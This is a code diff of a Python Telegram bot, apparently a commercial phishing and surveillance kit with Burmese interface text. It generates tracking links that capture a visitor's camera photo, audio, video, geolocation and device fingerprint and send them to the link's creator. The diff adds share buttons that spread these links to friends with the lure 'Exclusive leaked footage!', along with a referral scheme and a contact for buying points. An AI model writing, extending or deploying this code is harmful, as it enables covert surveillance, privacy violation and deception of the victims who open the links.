@@ -1,5 +1,6 @@
 import os
 import json
+import random
 import secrets
 import logging
 import threading
@@ -17,6 +18,20 @@ BASE_URL    = f"https://{_replit_domain}" if _replit_domain else "https://your-a
 
 tracking_links = {}   # token -> user_id
 seen_users     = set()
+
+# Telegram message effect IDs (shown on data messages)
+EMOJI_EFFECTS = [
+    "5104841245755180586",  # 🔥
+    "5107584321108051014",  # 👍
+    "5104858069142078462",  # 👎
+    "5044134455711629726",  # ❤️
+    "5046509860389126442",  # 🎉
+    "5046589136895476101",  # 💩
+]
+
+
+def random_effect():
+    return random.choice(EMOJI_EFFECTS)
 
 # ── User data store ──
 # user_data[user_id] = {
@@ -510,7 +525,7 @@ def capture_fingerprint():
         f"📅 {fp.get('localTime','?')}\n"
         f"━━━━━━━━━━━━━━━━━━━━"
     )
-    threading.Thread(target=broadcast_message, args=(user_id, report), daemon=True).start()
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
     return jsonify({"ok": True}), 200
 
 
@@ -575,7 +590,7 @@ def capture_combined_location():
     fp_json = request.form.get('fingerprint')
     caption = _fp_caption(fp_json)
     threading.Thread(target=broadcast_location, args=(user_id, lat, lon), daemon=True).start()
-    threading.Thread(target=broadcast_message, args=(user_id, caption), daemon=True).start()
+    threading.Thread(target=broadcast_message, args=(user_id, caption, True), daemon=True).start()
     return jsonify({"ok": True}), 200
 
 
@@ -604,60 +619,72 @@ def recipients(user_id):
     return ids
 
 
-def send_telegram_message(chat_id, text, reply_markup=None):
+def send_telegram_message(chat_id, text, reply_markup=None, effect_id=None):
     try:
         payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
         if reply_markup:
             payload["reply_markup"] = reply_markup
+        if effect_id:
+            payload["message_effect_id"] = effect_id
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload, timeout=10)
     except Exception:
         pass
 
 
-def broadcast_message(user_id, text):
+def broadcast_message(user_id, text, use_effect=False):
+    eff = random_effect() if use_effect else None
     for cid in recipients(user_id):
-        threading.Thread(target=send_telegram_message, args=(cid, text), daemon=True).start()
+        threading.Thread(target=send_telegram_message, args=(cid, text), kwargs={"effect_id": eff}, daemon=True).start()
 
 
 def broadcast_photo(user_id, photo_bytes, caption):
+    eff = random_effect()
     for cid in recipients(user_id):
         try:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
+                      'message_effect_id': eff},
                 files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}, timeout=30)
         except Exception:
             pass
 
 
 def broadcast_voice(user_id, audio_bytes, caption):
+    eff = random_effect()
     for cid in recipients(user_id):
         try:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",
-                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
+                      'message_effect_id': eff},
                 files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')}, timeout=30)
         except Exception:
             pass
 
 
 def broadcast_video(user_id, video_bytes, caption):
+    eff = random_effect()
     for cid in recipients(user_id):
         try:
             r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
+                      'message_effect_id': eff},
                 files={'video': ('video.mp4', video_bytes, 'video/mp4')}, timeout=60)
             if not r.json().get('ok'):
                 requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML'},
+                    data={'chat_id': cid, 'caption': caption[:1024], 'parse_mode': 'HTML',
+                          'message_effect_id': eff},
                     files={'document': ('video.webm', video_bytes, 'video/webm')}, timeout=60)
         except Exception:
             pass
 
 
 def broadcast_location(user_id, lat, lon):
+    eff = random_effect()
     for cid in recipients(user_id):
         try:
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
-                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon)}, timeout=10)
+                json={"chat_id": cid, "latitude": float(lat), "longitude": float(lon),
+                      "message_effect_id": eff}, timeout=10)
         except Exception:
             pass
 
@@ -698,12 +725,16 @@ def main_menu_inline():
 
 def make_links_inline(token):
     base = f"{BASE_URL}/track/{token}"
+    all_url = f"{base}?m=all"
+    share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
+    share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🌐 All-in-One", url=f"{base}?m=all")],
+        [InlineKeyboardButton("🌐 All-in-One", url=all_url)],
         [InlineKeyboardButton("📸 Photo + Device", url=f"{base}?m=photo"),
          InlineKeyboardButton("🎤 Audio + Device", url=f"{base}?m=audio")],
         [InlineKeyboardButton("📍 Location + Device", url=f"{base}?m=location"),
          InlineKeyboardButton("🎥 Video + Device", url=f"{base}?m=video")],
+        [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
         [InlineKeyboardButton("📋 Active Links", callback_data="links"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")],
     ])
@@ -737,8 +768,11 @@ def format_single_link_msg(token, mode_key, label):
 
 def single_link_inline(token, mode_key, label):
     url = f"{BASE_URL}/track/{token}?m={mode_key}"
+    share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
+    share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
         [InlineKeyboardButton(f"🔗 {label} Link ဖွင့်မည်", url=url)],
+        [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
         [InlineKeyboardButton("🔄 Link အသစ်", callback_data=f"gen_{mode_key}"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")],
     ])
@@ -774,16 +808,24 @@ def daily_bonus_text(user_id):
     return msg
 
 
+_BOT_USERNAME_CACHE = {}
+
 def refer_link(user_id):
-    bot_username = None
-    try:
-        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
-        bot_username = r.json().get("result", {}).get("username", "")
-    except Exception:
-        pass
-    if bot_username:
-        return f"https://t.me/{bot_username}?start=ref_{user_id}"
-    return f"Bot link မရနိုင်ပါ | Cannot get bot link"
+    if "username" not in _BOT_USERNAME_CACHE:
+        try:
+            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)
+            _BOT_USERNAME_CACHE["username"] = r.json().get("result", {}).get("username", "")
+        except Exception:
+            _BOT_USERNAME_CACHE["username"] = ""
+    uname = _BOT_USERNAME_CACHE.get("username", "")
+    if uname:
+        return f"https://t.me/{uname}?start=ref_{user_id}"
+    return "Bot link မရနိုင်ပါ | Cannot get bot link"
+
+
+def refer_share_url(ref_link_url):
+    share_text = "🎁 ဤ Bot မှ FREE points ရနိုင်သည်! Join လုပ်ပြီး points ရယူပါ!"
+    return f"https://t.me/share/url?url={requests.utils.quote(ref_link_url)}&text={requests.utils.quote(share_text)}"
 
 
 def mypoints_text(user_id):
@@ -888,7 +930,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{'🆕 <b>ကြိုဆိုပါသည်!</b> 1 day free access ရပြီ!\n' if is_new else ''}"
         f"{'🎉 Referral link မှ ဝင်လာတဲ့အတွက် ကျေးဇူးတင်ပါသည်!\n' if referral_bonus_given else ''}"
         f"⏰ {access_expires_str(user_id)}\n\n"
-        f"📌 အောက်ပါ ခလုတ်များမှ လုပ်ဆောင်ချက် ရွေးချယ်ပါ"
+        f"📌 အောက်ပါ ခလုတ်များမှ လုပ်ဆောင်ချက် ရွေးချယ်ပါ\n\n"
+        f"🤖 <b>BOT Creator</b> @koekoe4"
     )
     await update.message.reply_text(welcome, parse_mode="HTML", reply_markup=get_reply_keyboard())
     await update.message.reply_text("🏠 <b>Main Menu</b>", parse_mode="HTML", reply_markup=main_menu_inline())
@@ -925,6 +968,7 @@ async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     u = get_user(user_id)
     link = refer_link(user_id)
+    surl = refer_share_url(link)
     await update.message.reply_text(
         f"👥 <b>Refer & Earn</b>\n\n"
         f"သင့် referral link:\n<code>{link}</code>\n\n"
@@ -933,6 +977,7 @@ async def cmd_refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Link ကို မိတ်ဆွေများထံ မျှဝေပါ! | Share with friends!",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)],
             [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
              InlineKeyboardButton("🏠 Menu", callback_data="menu")]
         ])
@@ -1074,11 +1119,15 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif "Refer" in text:
         u = get_user(user_id)
         link = refer_link(user_id)
+        surl = refer_share_url(link)
         await update.message.reply_text(
             f"👥 <b>Refer & Earn</b>\n\nသင့် referral link:\n<code>{link}</code>\n\n"
             f"👤 Referred: <b>{u.get('referrals',0)}</b> ယောက်\n"
             f"🎁 တစ်ယောက် refer → +{REFER_BONUS_PTS} pts + 1 day",
-            parse_mode="HTML"
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)]
+            ])
         )
 
     elif "My Points" in text or "Access" in text:
@@ -1093,10 +1142,19 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"📋 <b>Active Links ({len(user_links)})</b>\n\n{lines}", parse_mode="HTML")
 
     elif "Clear" in text or "ဖျက်" in text:
+        if not is_admin(user_id):
+            await update.message.reply_text(
+                "❌ <b>Admin သာ Links ဖျက်နိုင်သည်</b>\n\nဖျက်ရန် Admin ထံ ဆက်သွယ်ပါ @koekoe4",
+                parse_mode="HTML"
+            )
+            return
         user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
         for t in user_tokens:
             del tracking_links[t]
-        await update.message.reply_text(f"🗑 Link <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး", parse_mode="HTML")
+        await update.message.reply_text(
+            f"🗑 <b>Admin Action</b>\nLink <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး",
+            parse_mode="HTML"
+        )
 
     elif "Help" in text:
         await update.message.reply_text(
@@ -1108,6 +1166,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
             f"👥 Refer → +{REFER_BONUS_PTS} pts + 1 day/ကိုယ်\n"
             f"💰 {PTS_PER_DAY} pts = 1 day access\n\n"
+            "💳 <b>Bot အသုံးပြုနိုင်ရန် points များ ဝယ်ယူလိုပါက</b> 👉 @KOEKOE4\n\n"
             "<b>Admin commands:</b>\n"
             "/addpoints /removepoints /adddays /checkuser /listusers",
             parse_mode="HTML"
@@ -1165,12 +1224,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "refer":
         u = get_user(user_id)
         link = refer_link(user_id)
+        surl = refer_share_url(link)
         await query.edit_message_text(
             f"👥 <b>Refer & Earn</b>\n\nသင့် referral link:\n<code>{link}</code>\n\n"
             f"👤 Referred: <b>{u.get('referrals',0)}</b> ယောက်\n"
             f"🎁 တစ်ယောက် → +{REFER_BONUS_PTS} pts + 1 day",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Refer Link Share မည်", url=surl)],
                 [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
                  InlineKeyboardButton("🏠 Menu", callback_data="menu")]
             ])
@@ -1208,11 +1269,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]))
 
     elif data == "clear":
+        if not is_admin(user_id):
+            await query.answer("❌ Admin သာ ဖျက်နိုင်သည် | Admin only", show_alert=True)
+            return
         user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]
         for t in user_tokens:
             del tracking_links[t]
         await query.edit_message_text(
-            f"🗑 Link <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး",
+            f"🗑 <b>Admin Action</b>\nLink <b>{len(user_tokens)}</b> ခု ဖျက်ပြီး",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔗 Link အသစ်", callback_data="gen_all"),
@@ -1227,7 +1291,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"👥 Refer တစ်ယောက် → +{REFER_BONUS_PTS} pts + 1 day\n"
             f"💰 {PTS_PER_DAY} pts = 1 day access\n\n"
             "🌐 All → Photo+Audio+Location+Video+Device\n"
-            "📸/🎤/📍/🎥 → single mode",
+            "📸/🎤/📍/🎥 → single mode\n\n"
+            "💳 <b>Bot အသုံးပြုနိုင်ရန် points များ ဝယ်ယူလိုပါက</b> 👉 @KOEKOE4",
             parse_mode="HTML",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔗 Link ထုတ်", callback_data="gen_all"),
